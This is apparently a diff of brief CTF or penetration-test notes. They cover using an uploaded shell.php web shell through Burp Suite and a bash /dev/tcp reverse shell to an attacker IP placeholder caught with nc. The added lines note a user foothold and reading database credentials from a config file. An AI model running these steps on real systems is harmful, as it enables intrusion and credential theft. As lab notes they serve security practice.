@@ -17,4 +17,5 @@ Content-Type: application/octet-stream
 -----------
 Edit user -> select shell.php image(i)(Go to Uploaded) -> <url>?cmd=<command> -> burpsuite intercept
 -> change request method -> add 2 enters after last & cmd=bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1' --needs to be url encoded
-nc -nlvp <port> -> get www shell
+nc -nlvp <port> -> user dash
+Go to config -> database.php -> username, password
